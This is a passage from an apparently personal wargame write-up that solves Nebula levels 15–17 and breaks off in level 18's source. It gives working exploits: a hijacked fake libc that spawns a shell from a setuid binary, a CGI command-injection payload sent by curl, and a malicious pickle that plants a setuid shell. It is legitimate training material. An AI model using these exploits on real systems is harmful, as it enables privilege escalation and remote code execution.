stat64(&#34;/var/tmp/flag15/cmov&#34;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&#34;/var/tmp/flag15/libc.so.6&#34;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&#34;/var/tmp/flag15&#34;, {st_mode=S_IFDIR|0775, st_size=3, ...}) = 0
open(&#34;/etc/ld.so.cache&#34;, O_RDONLY)      = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=33815, ...}) = 0
mmap2(NULL, 33815, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7862000
close(3)                                = 0
access(&#34;/etc/ld.so.nohwcap&#34;, F_OK)      = -1 ENOENT (No such file or directory)
open(&#34;/lib/i386-linux-gnu/libc.so.6&#34;, O_RDONLY) = 3
read(3, &#34;\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\222\1\0004\0\0\0&#34;..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1544392, ...}) = 0
mmap2(NULL, 1554968, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xe78000
mmap2(0xfee000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x176) = 0xfee000
mmap2(0xff1000, 10776, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xff1000
close(3)                                = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7861000
set_thread_area({entry_number:-1 -&gt; 6, base_addr:0xb78618d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
mprotect(0xfee000, 8192, PROT_READ)     = 0
mprotect(0x8049000, 4096, PROT_READ)    = 0
mprotect(0x199000, 4096, PROT_READ)     = 0
munmap(0xb7862000, 33815)               = 0
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 1), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb786a000
write(1, &#34;strace it!\n&#34;, 11strace it!
)            = 11
exit_group(11)                          = ?
</code></pre></div><p>There are <strong>plenty</strong> of attempts to load <code>libc.so.6</code> from various locations! I checked out what is in <code>/var/tmp</code> and found the original <code>flag15</code> folder there. It was empty. My initial thought were I need to give it a <code>libc.so.6</code> to load, but obviously one that will be useful enough to me so that I may gain some form of code execution.</p>
<p>This challenge had me on another Google ride in order to understand what is going on here. From what I could gather, when a binary is compiled with <code>gcc</code>, it is possible to add <code>hwcap</code> support for different processor architectures. It is also possible to tell the linker from where it should load dynamic libraries using a <a href=http://en.wikipedia.org/wiki/Rpath>rpath</a>. In the case of <code>flag15</code>, the <code>RPATH</code> is set to <code>/var/tmp/flag15</code>. We can see this using <code>readelf</code> and looking at the dynamic section:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level15@nebula:/home/flag15$ readelf -d ./flag15

Dynamic section at offset 0xf20 contains <span style=color:#ae81ff>21</span> entries:
  Tag        Type                         Name/Value
 0x00000001 <span style=color:#f92672>(</span>NEEDED<span style=color:#f92672>)</span>                     Shared library: <span style=color:#f92672>[</span>libc.so.6<span style=color:#f92672>]</span>
 0x0000000f <span style=color:#f92672>(</span>RPATH<span style=color:#f92672>)</span>                      Library rpath: <span style=color:#f92672>[</span>/var/tmp/flag15<span style=color:#f92672>]</span>
 0x0000000c <span style=color:#f92672>(</span>INIT<span style=color:#f92672>)</span>                       0x80482c0
 0x0000000d <span style=color:#f92672>(</span>FINI<span style=color:#f92672>)</span>                       0x80484ac

 <span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
</code></pre></div><p>Ok, so that kinda explained the <em>why</em> its loading libc.so.6 from there, but not really the &lsquo;how this can be useful&rsquo;. I was still a little stuck on the previous <code>LD_PRELOAD</code> hackery, but had to constantly remind myself that that environment variable will be discarded in the case of the SETUID program.</p>
<p>I was a little unsure how to get something useful going from here. I touched a file called <code>libc.so.6</code> in <code>/var/tmp/flag15/</code> and launched the binary, just to get a starting point:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level15@nebula:/var/tmp/flag15$ touch libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
/home/flag15/flag15: error <span style=color:#66d9ef>while</span> loading shared libraries: /var/tmp/flag15/libc.so.6: file too short
</code></pre></div><p>I was not expecting much from that attempt, but it helped me get started. Eventually I figured I could have a look at <code>flag15</code> and check which libc function I could &ldquo;override??&rdquo; from the RELO table:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level15@nebula:/var/tmp/flag15$ objdump -R ~flag15/flag15

/home/flag15/flag15:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049ff0 R_386_GLOB_DAT    __gmon_start__
0804a000 R_386_JUMP_SLOT   puts
0804a004 R_386_JUMP_SLOT   __gmon_start__
0804a008 R_386_JUMP_SLOT   __libc_start_main
</code></pre></div><p><code>puts()</code> seems like an ok target for me! This is probably the function used to print the <em>strace it!</em> message. At this stage I figured I could take the same route as I did with the previous <code>LD_PRELOAD</code> attack, except this time I just &lsquo;fake&rsquo; it in my fake libc. I looked up the <code>puts()</code> arguments from the man page again and started a new function:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level15@nebula:/var/tmp/flag15$ cat fake_libc.c
<span style=color:#75715e>#include&lt;stdio.h&gt;</span>
int puts<span style=color:#f92672>(</span>const char *s<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
    printf<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Not the real puts!\n&#34;</span><span style=color:#f92672>)</span>;
<span style=color:#f92672>}</span>

level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC fake_libc.c -o libc.so.6

level15@nebula:/var/tmp/flag15$ ~flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available <span style=color:#f92672>(</span>required by /home/flag15/flag15<span style=color:#f92672>)</span>
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available <span style=color:#f92672>(</span>required by /var/tmp/flag15/libc.so.6<span style=color:#f92672>)</span>
/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc.so.6 with link time reference
</code></pre></div><p>Ow, that exploded pretty badly it seems. From the error message I figured the function <code>__cxa_finalize</code> simply did not exist in my library, so all I had to do was add it&mldr; Right? I googled the <a href=https://refspecs.linuxbase.org/LSB_3.2.0/LSB-Core-generic/LSB-Core-generic/baselib---cxa_finalize.html>function arguments</a> and added it to my fake libc:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level15@nebula:/var/tmp/flag15$ cat fake_libc.c
<span style=color:#75715e>#include&lt;stdio.h&gt;</span>
void __cxa_finalize<span style=color:#f92672>(</span>void * d<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
<span style=color:#f92672>}</span>

int puts<span style=color:#f92672>(</span>const char *s<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
    printf<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Not the real puts!\n&#34;</span><span style=color:#f92672>)</span>;
<span style=color:#f92672>}</span>
level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available <span style=color:#f92672>(</span>required by /home/flag15/flag15<span style=color:#f92672>)</span>
/home/flag15/flag15: relocation error: /home/flag15/flag15: symbol __libc_start_main, version GLIBC_2.0 not defined in file libc.so.6 with link time reference
</code></pre></div><p>Oh! New error. I guess I was making progress. This time there is apparently no <code>__libc_start_main</code> in the library. At this stage I was a little confused as to what was going on here as this function was also in the RELO table for <code>flag15</code>. Anyways, as with <code>__cxa_finalize</code>, I Googled the <a href=http://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html>function arguments</a> for this one too and added it to my fake libc. It was also at this stage that I realized I could just use this function instead of <code>puts</code>, so I went ahead and deleted the other functions:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level15@nebula:/var/tmp/flag15$ cat fake_libc.c
<span style=color:#75715e>#include&lt;stdio.h&gt;</span>

int __libc_start_main<span style=color:#f92672>(</span>int <span style=color:#f92672>(</span>*main<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>int, char * *, char * *<span style=color:#f92672>)</span>, int argc, char * * ubp_av, void <span style=color:#f92672>(</span>*init<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>void<span style=color:#f92672>)</span>, void <span style=color:#f92672>(</span>*fini<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>void<span style=color:#f92672>)</span>, void <span style=color:#f92672>(</span>*rtld_fini<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>void<span style=color:#f92672>)</span>, void <span style=color:#f92672>(</span>* stack_end<span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
    <span style=color:#66d9ef>return</span> 0;
<span style=color:#f92672>}</span>

level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available <span style=color:#f92672>(</span>required by /home/flag15/flag15<span style=color:#f92672>)</span>
Inconsistency detected by ld.so: dl-lookup.c: 169: check_match: Assertion <span style=color:#e6db74>`</span>version-&gt;filename <span style=color:#f92672>==</span> <span style=color:#f92672>((</span>void *<span style=color:#f92672>)</span>0<span style=color:#f92672>)</span> <span style=color:#f92672>||</span> ! _dl_name_match_p <span style=color:#f92672>(</span>version-&gt;filename, map<span style=color:#f92672>)</span><span style=color:#960050;background-color:#1e0010>&#39;</span> failed!
</code></pre></div><p>Oh! Another new error :( This time though it was not about a missing function/symbol, but rather something I could not make out by myself. I found little information about this specific error. After a really really long time of searching I finally decided to <code>ldd</code> <code>flag15</code> again now that my fake libc is available:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level15@nebula:/var/tmp/flag15$ ldd ~flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available <span style=color:#f92672>(</span>required by /home/flag15/flag15<span style=color:#f92672>)</span>
    linux-gate.so.1 <span style=color:#f92672>=</span>&gt;  <span style=color:#f92672>(</span>0x00e47000<span style=color:#f92672>)</span>
    libc.so.6 <span style=color:#f92672>=</span>&gt; /var/tmp/flag15/libc.so.6 <span style=color:#f92672>(</span>0x00761000<span style=color:#f92672>)</span>
</code></pre></div><p>The search term <em>no version information available (required by</em> was the magic that finally got me towards an answer! I came across <a href=http://stackoverflow.com/questions/137773/what-does-the-no-version-information-available-error-from-linux-dynamic-linker>this</a> and <a href=http://superuser.com/questions/735736/no-version-information-available-required-by-usr-bin-ssh>this</a> post which talks about custom linking scripts. Basically, if I were to create a file with the contents <code>GLIBC_2.0 {};</code> in it and tell the linker at compile time (with <code>-Wl</code>) about it, then my problem will go away :)</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level15@nebula:/var/tmp/flag15$ cat version.ld
GLIBC_2.0 <span style=color:#f92672>{</span>
<span style=color:#f92672>}</span>;

level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC -Wl,--version-script<span style=color:#f92672>=</span>version.ld fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ldd ~flag15/flag15
    linux-gate.so.1 <span style=color:#f92672>=</span>&gt;  <span style=color:#f92672>(</span>0x002b3000<span style=color:#f92672>)</span>
    libc.so.6 <span style=color:#f92672>=</span>&gt; /var/tmp/flag15/libc.so.6 <span style=color:#f92672>(</span>0x00ca0000<span style=color:#f92672>)</span>
</code></pre></div><p>w00t. My <code>ldd</code> Error went away :)</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC -Wl,--version-script<span style=color:#f92672>=</span>version.ld fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: version <span style=color:#e6db74>`</span>GLIBC_2.1.3<span style=color:#960050;background-color:#1e0010>&#39;</span> not found <span style=color:#f92672>(</span>required by /var/tmp/flag15/libc.so.6<span style=color:#f92672>)</span>
</code></pre></div><p>Another version related error. This time though it was for GLIBC version 2.1.3. I spiraled down another Google tunnel with this one and eventually came across static linking options for the linker. Basically, with <code>-Bstatic</code> and <code>-static-libgcc</code> we tell the compiler not to link against shared libraries. So, I added these too:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level15@nebula:/var/tmp/flag15$ gcc -shared -static-libgcc -fPIC -Wl,--version-script<span style=color:#f92672>=</span>version.ld,-Bstatic fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
Segmentation fault
</code></pre></div><p>And now we are segfaulting. Great! <strong>Not!</strong> I poked around <code>gdb</code> a little and prodded around. Eventually I figured I should check if my <code>__libc_start_main</code> function is being called before the crash:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level15@nebula:/var/tmp/flag15$ cat fake_libc.c
<span style=color:#75715e>#include&lt;stdio.h&gt;</span>

int __libc_start_main<span style=color:#f92672>(</span>int <span style=color:#f92672>(</span>*main<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>int, char * *, char * *<span style=color:#f92672>)</span>, int argc, char * * ubp_av, void <span style=color:#f92672>(</span>*init<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>void<span style=color:#f92672>)</span>, void <span style=color:#f92672>(</span>*fini<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>void<span style=color:#f92672>)</span>, void <span style=color:#f92672>(</span>*rtld_fini<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>void<span style=color:#f92672>)</span>, void <span style=color:#f92672>(</span>* stack_end<span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
    printf<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;hi mom!\n&#34;</span><span style=color:#f92672>)</span>; /* Added this line! */
    <span style=color:#66d9ef>return</span> 0;
<span style=color:#f92672>}</span>
level15@nebula:/var/tmp/flag15$ gcc -shared -static-libgcc -fPIC -Wl,--version-script<span style=color:#f92672>=</span>version.ld,-Bstatic fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
hi mom!
Segmentation fault
</code></pre></div><p>Yes! :D So even though I am causing <code>flag15</code> to crash, I have managed to introduce some code to it. I finally decided to add the <code>system()</code> call and recompile my fake libc.</p>
<p>So, to solve level15:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level15@nebula:/var/tmp/flag15$ cat fake_libc.c
<span style=color:#75715e>#include&lt;stdio.h&gt;</span>

int __libc_start_main<span style=color:#f92672>(</span>int <span style=color:#f92672>(</span>*main<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>int, char * *, char * *<span style=color:#f92672>)</span>, int argc, char * * ubp_av, void <span style=color:#f92672>(</span>*init<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>void<span style=color:#f92672>)</span>, void <span style=color:#f92672>(</span>*fini<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>void<span style=color:#f92672>)</span>, void <span style=color:#f92672>(</span>*rtld_fini<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>void<span style=color:#f92672>)</span>, void <span style=color:#f92672>(</span>* stack_end<span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
    system<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/bin/sh&#34;</span><span style=color:#f92672>)</span>;
    <span style=color:#66d9ef>return</span> 0;
<span style=color:#f92672>}</span>
level15@nebula:/var/tmp/flag15$ gcc -shared -static-libgcc -fPIC -Wl,--version-script<span style=color:#f92672>=</span>version.ld,-Bstatic fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
sh-4.2$ getflag
You have successfully executed getflag on a target account
</code></pre></div><h2 id=level16>level16<a hidden class=anchor aria-hidden=true href=#level16>#</a></h2>
<p><a href=https://exploit-exercises.com/nebula/level16/>Level16&rsquo;s Description</a>:</p>
<blockquote>
<p>There is a perl script running on port 1616.</p>
</blockquote>
<p>With the description we are provided with the source code of a small Perl program:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-perl data-lang=perl><span style=color:#75715e>#!/usr/bin/env perl</span>

<span style=color:#66d9ef>use</span> CGI <span style=color:#e6db74>qw{param}</span>;

<span style=color:#66d9ef>print</span> <span style=color:#e6db74>&#34;Content-type: text/html\n\n&#34;</span>;

<span style=color:#66d9ef>sub</span> <span style=color:#a6e22e>login</span> {
  $username <span style=color:#f92672>=</span> $_[<span style=color:#ae81ff>0</span>];
  $password <span style=color:#f92672>=</span> $_[<span style=color:#ae81ff>1</span>];

  $username <span style=color:#f92672>=~</span> tr<span style=color:#e6db74>/a-z/</span>A<span style=color:#f92672>-</span>Z<span style=color:#f92672>/</span>; <span style=color:#75715e># conver to uppercase</span>
  $username <span style=color:#f92672>=~</span> <span style=color:#e6db74>s/\s.*//</span>;        <span style=color:#75715e># strip everything after a space</span>

  @output <span style=color:#f92672>=</span> <span style=color:#e6db74>`egrep &#34;^$username&#34; /home/flag16/userdb.txt 2&gt;&amp;1`</span>;
  <span style=color:#66d9ef>foreach</span> $line (@output) {
      ($usr, $pw) <span style=color:#f92672>=</span> split(<span style=color:#e6db74>/:/</span>, $line);


      <span style=color:#66d9ef>if</span>($pw <span style=color:#f92672>=~</span> $password) {
          <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1</span>;
      }
  }

  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
}

<span style=color:#66d9ef>sub</span> <span style=color:#a6e22e>htmlz</span> {
  <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#34;&lt;html&gt;&lt;head&gt;&lt;title&gt;Login resuls&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&#34;</span>);
  <span style=color:#66d9ef>if</span>($_[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>) {
      <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#34;Your login was accepted&lt;br/&gt;&#34;</span>);
  } <span style=color:#66d9ef>else</span> {
      <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#34;Your login failed&lt;br/&gt;&#34;</span>);
  }
  <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#34;Would you like a cookie?&lt;br/&gt;&lt;br/&gt;&lt;/body&gt;&lt;/html&gt;\n&#34;</span>);
}

htmlz(login(param(<span style=color:#e6db74>&#34;username&#34;</span>), param(<span style=color:#e6db74>&#34;password&#34;</span>)));
</code></pre></div><p>This script has a seemingly less obvious command injection vulnerability. The <code>egrep</code> command eventually gets the <code>$username</code> variable. This after it has gone through 2 sets of filters, one converting the username to uppercase and another truncating everything after a space. These filters are the core of the challenge.</p>
<p>Similarly to the other command injections, I replicated the filters so that I could print the output and see how I could manipulate them. The biggest problem being the fact that everything was converted to uppercase. Thankfully, that got sorted really quickly when I learnt of the <code>${A,,}</code> operator in bash. After quite a bit of trying different things, I finally got something that would work. I would first make the egrep happy by redirecting something to it to grep through. Once that was done, I declared a new variable <code>A</code> and set the command I wanted to run to it. Thereafter I converted it to lowercase and executed it wit <code>${A,,}</code> and commented the rest of the line out with a hash (#).</p>
<p>So, to solve level16:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level16@nebula:~$ vim /var/tmp/flag16.sh
level16@nebula:~$ chmod +x /var/tmp/flag16.sh
level16@nebula:~$ cat /var/tmp/flag16.sh
<span style=color:#75715e>#!/bin/sh</span>
gcc /var/tmp/shell.c -o /var/tmp/flag16
chmod <span style=color:#ae81ff>4777</span> /var/tmp/flag16
</code></pre></div><p>On my host machine, I requested the web page hosting the perl script, triggering <code>/var/tmp/flag16</code> to run:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>~ » curl -v <span style=color:#e6db74>&#34;http://192.168.217.239:1616/index.cgi?</span><span style=color:#66d9ef>$(</span>python -c <span style=color:#e6db74>&#39;import urllib; print urllib.urlencode({ &#34;username&#34; : &#34;&#34;&#34;&#34;&lt;/etc/passwd;A=&#34;/var/tmp/flag16.sh&#34;;${A,,};#&#34;&#34;&#34;, &#34;password&#34; : &#34;a&#34; })&#39;</span><span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span>
* Hostname was NOT found in DNS cache
*   Trying 192.168.217.239...
* Connected to 192.168.217.239 <span style=color:#f92672>(</span>192.168.217.239<span style=color:#f92672>)</span> port <span style=color:#ae81ff>1616</span> <span style=color:#f92672>(</span><span style=color:#75715e>#0)</span>
&gt; GET /index.cgi?username<span style=color:#f92672>=</span>%22%3C%2Fetc%2Fpasswd%3BA%3D%22%2Fvar%2Ftmp%2Fflag16.sh%22%3B%24%7BA%2C%2C%7D%3B%23&amp;password<span style=color:#f92672>=</span>a HTTP/1.1
&gt; User-Agent: curl/7.37.1
&gt; Host: 192.168.217.239:1616
&gt; Accept: */*
&gt;
* HTTP 1.0, assume close after body
&lt; HTTP/1.0 <span style=color:#ae81ff>200</span> OK
&lt; Content-type: text/html
&lt;
&lt;html&gt;&lt;head&gt;&lt;title&gt;Login resuls&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Your login failed&lt;br/&gt;Would you like a cookie?&lt;br/&gt;&lt;br/&gt;&lt;/body&gt;&lt;/html&gt;
* Closing connection <span style=color:#ae81ff>0</span>
</code></pre></div><p>And then, just to read the flag:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level16@nebula:~$ /var/tmp/flag16
sh-4.2$ getflag
You have successfully executed getflag on a target account
</code></pre></div><h2 id=level17>level17<a hidden class=anchor aria-hidden=true href=#level17>#</a></h2>
<p><a href=https://exploit-exercises.com/nebula/level17/>Level17&rsquo;s Description</a>:</p>
<blockquote>
<p>There is a python script listening on port 10007 that contains a vulnerability.</p>
</blockquote>
<p>With the description we are provided with the source code of a small Python program:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-perl data-lang=perl><span style=color:#75715e>#!/usr/bin/python</span>

import os
import pickle
import time
import socket
import signal

signal<span style=color:#f92672>.</span>signal(signal<span style=color:#f92672>.</span>SIGCHLD, signal<span style=color:#f92672>.</span>SIG_IGN)

def server(skt):
  line <span style=color:#f92672>=</span> skt<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>1024</span>)

  obj <span style=color:#f92672>=</span> pickle<span style=color:#f92672>.</span>loads(line)

  <span style=color:#66d9ef>for</span> i in obj:
      clnt<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#34;why did you send me &#34;</span> <span style=color:#f92672>+</span> i <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;?\n&#34;</span>)

skt <span style=color:#f92672>=</span> socket<span style=color:#f92672>.</span>socket(socket<span style=color:#f92672>.</span>AF_INET, socket<span style=color:#f92672>.</span>SOCK_STREAM, <span style=color:#ae81ff>0</span>)
skt<span style=color:#f92672>.</span>bind((<span style=color:#e6db74>&#39;0.0.0.0&#39;</span>, <span style=color:#ae81ff>10007</span>))
skt<span style=color:#f92672>.</span>listen(<span style=color:#ae81ff>10</span>)

<span style=color:#66d9ef>while</span> True:
  clnt, addr <span style=color:#f92672>=</span> skt<span style=color:#f92672>.</span>accept()

  <span style=color:#66d9ef>if</span>(os<span style=color:#f92672>.</span>fork() <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>):
      clnt<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#34;Accepted connection from %s:%d&#34;</span> % <span style=color:#960050;background-color:#1e0010>(</span>addr[<span style=color:#ae81ff>0</span>], addr[<span style=color:#ae81ff>1</span>]))
      server(clnt)
      exit(<span style=color:#ae81ff>1</span>)
</code></pre></div><p>With this level, it was immediately obvious that user input was being used to unpickle. This is dangerous as user supplied code could be executed when the unpickle occurs. So, my plan was to write a simple class with a <code>__reduce__</code> method to pickle and send that over the socket that this code is listening on.</p>
<p>So, to solve level17:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level17@nebula:/var/tmp/flag17-prep$ cat sploit.py
from netcat import Netcat
import pickle
import os

command <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;gcc /var/tmp/shell.c -o /var/tmp/flag17; chmod 4777 /var/tmp/flag17&#34;&#34;&#34;</span>

<span style=color:#75715e># setup the pickle</span>
class DoCmd<span style=color:#f92672>(</span>object<span style=color:#f92672>)</span>:
    def __reduce__<span style=color:#f92672>(</span>self<span style=color:#f92672>)</span>:
        <span style=color:#66d9ef>return</span> <span style=color:#f92672>(</span>os.system, <span style=color:#f92672>(</span><span style=color:#e6db74>&#39;{cmd}&#39;</span>.format<span style=color:#f92672>(</span>cmd <span style=color:#f92672>=</span> command<span style=color:#f92672>)</span>,<span style=color:#f92672>))</span>

nc <span style=color:#f92672>=</span>  Netcat<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;127.0.0.1&#39;</span>, 10007<span style=color:#f92672>)</span>
nc.read<span style=color:#f92672>()</span>
nc.write<span style=color:#f92672>(</span>pickle.dumps<span style=color:#f92672>(</span>DoCmd<span style=color:#f92672>()))</span>
nc.close<span style=color:#f92672>()</span>

level17@nebula:/var/tmp/flag17-prep$ python sploit.py
level17@nebula:/var/tmp/flag17-prep$ /var/tmp/flag17
sh-4.2$ getflag
You have successfully executed getflag on a target account
</code></pre></div><h2 id=level18>level18<a hidden class=anchor aria-hidden=true href=#level18>#</a></h2>
<p><a href=https://exploit-exercises.com/nebula/level18/>Level18&rsquo;s Description</a>:</p>
<blockquote>
<p>Analyse the C program, and look for vulnerabilities in the program. There is an easy way to solve this level, an intermediate way to solve it, and a more difficult/unreliable way to solve it.</p>
</blockquote>
<p>With the description we are provided with the source code of a small C program:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/types.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;fcntl.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;getopt.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>struct</span> {
  FILE <span style=color:#f92672>*</span>debugfile;
  <span style=color:#66d9ef>int</span> verbose;
  <span style=color:#66d9ef>int</span> loggedin;
} globals;

<span style=color:#75715e>#define dprintf(...) if(globals.debugfile) \
</span><span style=color:#75715e>  fprintf(globals.debugfile, __VA_ARGS__)
</span><span style=color:#75715e>#define dvprintf(num, ...) if(globals.debugfile &amp;&amp; globals.verbose &gt;= num) \
</span><span style=color:#75715e>  fprintf(globals.debugfile, __VA_ARGS__)
</span><span style=color:#75715e></span>
<span style=color:#75715e>#define PWFILE &#34;/home/flag18/password&#34;
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>void</span> <span style=color:#a6e22e>login</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>pw)
{
  FILE <span style=color:#f92672>*</span>fp;

